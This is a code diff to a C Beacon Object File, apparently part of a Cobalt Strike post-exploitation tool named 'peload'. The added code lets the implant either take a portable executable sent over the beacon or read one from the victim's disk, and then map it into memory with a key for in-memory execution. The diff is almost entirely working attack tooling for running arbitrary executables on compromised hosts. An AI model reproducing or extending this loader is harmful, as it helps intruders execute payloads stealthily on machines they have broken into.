@@ -215,11 +215,60 @@ int go(IN PCHAR Buffer, IN ULONG Length)
 	int dataextracted = 0;
 	int peLen = 0;
 
+	//data var will either contain the full PE as bytes OR the name of a local PE to load. The bool 'local' tells peload which to expect. 
 	char* data = BeaconDataExtract(&parser, &peLen);
 	char* key = BeaconDataExtract(&parser, &dataextracted);
+	BOOL local = BeaconDataInt(&parser);
 
-	//Map PE into memory
-	peLoader(data, peLen, key);
+	//If a local PE was specified, try and read it from disk
+	if(local)
+	{
+		//Try and open a handle to the specified file
+		HANDLE hFile = CreateFileA(data, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); 
 
-	return 0;
+		if (hFile == INVALID_HANDLE_VALUE) 
+		{
+			BeaconPrintf(CALLBACK_OUTPUT, "Unable to open %s. Last error: %d", data, GetLastError());
+			BeaconPrintf(CALLBACK_OUTPUT, "peload failure");
+			return -1; 
+		}
+
+		LARGE_INTEGER lpFileSize;
+
+		//Get size of file
+		if(!GetFileSizeEx(hFile, &lpFileSize))
+		{
+			BeaconPrintf(CALLBACK_OUTPUT, "Unable to determine filesize of %s. Last error: %d", data, GetLastError());
+			BeaconPrintf(CALLBACK_OUTPUT, "peload failure");
+			return -1;   
+		}
+
+		//Allocate buffer to hold PE
+		char* pe = calloc(lpFileSize.LowPart + 1, sizeof(char));
+
+		//Read file into buffer
+		DWORD bRead;
+		if(!ReadFile(hFile, pe, lpFileSize.LowPart, &bRead, NULL))
+		{
+			BeaconPrintf(CALLBACK_OUTPUT, "Unable to read %s from disk. Last error: %d", data, GetLastError());
+			BeaconPrintf(CALLBACK_OUTPUT, "peload failure");
+			return -1;   
+		}
+
+		//Map PE into memory
+		peLoader(pe, lpFileSize.LowPart, key);
+
+		//Clear file from memory
+		memset(pe, 0, lpFileSize.LowPart);
+		free(pe);
+			
+		return 0;
+	}
+
+	//Otherwise we were sent the full PE already, just load it.,
+	else
+	{
+		peLoader(data, peLen, key);
+		return 0;
+	}
 }
